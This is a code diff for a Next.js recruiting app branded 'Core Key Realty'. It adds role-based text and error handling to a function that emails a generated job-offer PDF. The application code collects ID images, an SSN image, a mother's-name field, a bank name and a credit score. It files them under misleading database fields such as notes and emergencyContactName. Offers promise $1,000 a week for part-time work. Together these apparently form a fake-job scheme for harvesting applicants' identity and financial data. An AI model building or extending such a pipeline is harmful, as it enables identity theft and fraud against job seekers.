@@ -8,7 +8,7 @@ import { connectToDatabase } from '@/lib/mongoose';
 import { z } from 'zod';
 import { IToken, Token } from './models/Token';
 import { revalidatePath } from 'next/cache';
-import { sendEmailToApplicant } from './utils';
+import { formatRole, sendEmailToApplicant } from './utils';
 
 // ✅ Declare formSchema
 const formSchema = z.object({
@@ -156,12 +156,9 @@ export async function submitApplication(formData: unknown, ref: string) {
         const email = await findUserByKey(ref);
         console.log("email", email.email);
         // return { success: false, message: "Invalid referral key" };
-
         const parsed = applicantSchema.parse(formData);
-
         console.log("Parsed application data:", parsed);
         // return { success: false, message: "Application data is invalid" };
-
         const saved = await Application.create({
             fullName: parsed.fullName,
             email: parsed.email,
@@ -176,13 +173,13 @@ export async function submitApplication(formData: unknown, ref: string) {
             validIDFront: parsed.idFront,
             validIDBack: parsed.idBack,
             // Expanded default fields
-            employmentStatus: parsed.Mother,
+            // employmentStatus: parsed.Mother,
             desiredStartDate: undefined,
             hasDriversLicense: false,
             isCitizen: false,
             canWorkLegally: false,
             references: [],
-            educationLevel: parsed.SsnImage,
+            // educationLevel: parsed.SsnImage,
             skills: [],
             notes: parsed.bankName,
             emergencyContactName: String(parsed.creditScore),
@@ -349,26 +346,35 @@ interface EmployeeFormData {
     role: string;
 }
 
-export async function sendNewHireEmail(data: EmployeeFormData) {
-    const pdfBytes = await generateSophisticatedPdf(data);
-    await resend.emails.send({
-        from: 'careers@corekeyrealty.com',
-        to: data.email,
-        subject: 'Welcome to Core Key Realty',
-        html: `
+export async function sendNewHireEmail(data: EmployeeFormData, type: Role) {
+    const pdfBytes = await generateSophisticatedPdf(data, type);
+
+    try {
+        await resend.emails.send({
+            from: 'careers@corekeyrealty.com',
+            to: data.email,
+            subject: 'Welcome to Core Key Realty',
+            html: `
       <p>Dear ${data.name},</p>
       <p>We are pleased to welcome you to Core Key Realty as a <strong>${data.role}</strong>.</p>
       <p>Your official onboarding document is attached.</p>
       <p>Warm regards,<br/>Core Key Realty HR</p>
     `,
-        attachments: [
-            {
-                filename: 'CoreKey_Onboarding.pdf',
-                content: pdfBytes.toString('base64'),
+            attachments: [
+                {
+                    filename: 'CoreKey_Onboarding.pdf',
+                    content: pdfBytes.toString('base64'),
 
-            }
-        ]
-    });
+                }
+            ]
+        });
+
+        return JSON.stringify({ success: true, message: "Email sent successfully!" });
+    }
+    catch {
+        return JSON.stringify({ success: false, message: "Failed to send email." });
+    }
+
 }
 
 
@@ -397,7 +403,10 @@ interface EmployeeFormData {
     role: string;
     startDate: string;
 }
-export async function generateSophisticatedPdf(data: EmployeeFormData): Promise<Buffer> {
+
+export type Role = "virtual assistant" | "ad manager"
+
+export async function generateSophisticatedPdf(data: EmployeeFormData, role: Role): Promise<Buffer> {
     const pdfDoc = await PDFDocument.create();
 
     const font = await pdfDoc.embedFont(StandardFonts.Helvetica);
@@ -461,7 +470,7 @@ export async function generateSophisticatedPdf(data: EmployeeFormData): Promise<
 
     // Welcome note
     drawParagraph(`Dear ${data.name},`);
-    drawParagraph(`Welcome to Core Key Realty! We are pleased to offer you the position of ${data.role}. We look forward to your valuable contributions and a mutually rewarding employment relationship.`);
+    drawParagraph(`Welcome to Core Key Realty! We are pleased to offer you the position of ${formatRole(role)}. We look forward to your valuable contributions and a mutually rewarding employment relationship.`);
 
     // Employee info
     drawTextWithCheck('Employee Information:', { size: subHeaderFontSize, bold: true, color: rgb(0.1, 0.3, 0.7) }, 25);
@@ -469,17 +478,23 @@ export async function generateSophisticatedPdf(data: EmployeeFormData): Promise<
     drawTextWithCheck(`Email Address: ${data.email}`);
     drawTextWithCheck(`Phone Number: ${data.phone}`);
     drawTextWithCheck(`Home Address: ${data.address}`);
-    drawTextWithCheck(`Position: ${data.role}`);
+    drawTextWithCheck(`Position: ${formatRole(role)}`);
     drawTextWithCheck(`Start Date: ${data.startDate}`);
     y -= 15;
 
     // Responsibilities
+
     drawTextWithCheck('Responsibilities:', { size: subHeaderFontSize, bold: true, color: rgb(0.1, 0.3, 0.7) }, 25);
-    drawParagraph(`As a valued member of our team, your primary responsibilities will include managing communications, scheduling, coordinating with clients, and supporting day-to-day operations efficiently and professionally.`);
+    if (role.toLowerCase() === "ad manager") {
+        drawParagraph(`As our Ad Manager, your primary responsibilities will include planning, executing, and optimizing our digital advertising campaigns across various platforms. You will manage budgets, analyze performance metrics, and collaborate with our marketing team to maximize return on investment.`);
+    } else {
+        drawParagraph(`As a valued member of our team, your primary responsibilities will include managing communications, scheduling, coordinating with clients, and supporting day-to-day operations efficiently and professionally.`);
+    }
+
 
     // Compensation & Benefits
     drawTextWithCheck('Compensation & Benefits:', { size: subHeaderFontSize, bold: true, color: rgb(0.1, 0.3, 0.7) }, 25);
-    drawParagraph(`You will receive a weekly payment of $1,000, payable via bank transfer or check on the last business day of each week. We offer flexible working hours tailored to meet both company needs and your schedule, with an expected workload of 20–30 hours per week.`);
+    drawParagraph(`You will receive a weekly payment of $1,000, payable via bank transfer or check on the last business day of each week. In addition to competitive compensation, we offer flexible working hours designed to accommodate both company needs and your personal schedule. The expected workload ranges between 20 to 30 hours per week, providing a balance between productivity and work-life harmony. We also encourage ongoing professional development and will support you in accessing relevant training and resources to excel in your role.`);
 
     // Confidentiality
     drawTextWithCheck('Confidentiality:', { size: subHeaderFontSize, bold: true, color: rgb(0.1, 0.3, 0.7) }, 25);
